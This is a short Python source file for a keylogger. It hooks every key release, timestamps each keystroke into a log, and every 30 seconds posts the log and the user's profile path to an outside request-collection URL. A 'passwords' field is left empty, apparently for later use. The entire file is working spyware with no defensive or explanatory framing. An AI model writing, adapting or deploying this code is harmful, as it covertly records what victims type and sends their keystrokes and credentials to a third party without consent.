import keyboard #keylogs
from threading import Semaphore, Timer
from datetime import datetime

import requests
import os

send_interval= 30 #1 min
file_url = "url"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)
    
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"
        time = datetime.now()
        self.log += ("\n" + time.strftime("%m/%d/%Y, %H:%M:%S") + "\t" + name)

    def postData(self):
        post_url = "https://postb.in/1603850404712-1531936014071"
        data = {
            'user' : os.environ['USERPROFILE'],
            'keystroke'  : self.log,
            'passwords' : ''
        }
        sender = requests.post(post_url,data)
        print(self.log)

    def report(self):
        if self.log:
            self.postData()
        self.log = ""
        timer = Timer(self.interval,self.report)
        timer.start()

        
    def run (self):
        keyboard.on_release(self.callback)
        self.report()
        self.semaphore.acquire()
    
def main():
    keylogger = Keylogger(send_interval)
    keylogger.run()

main()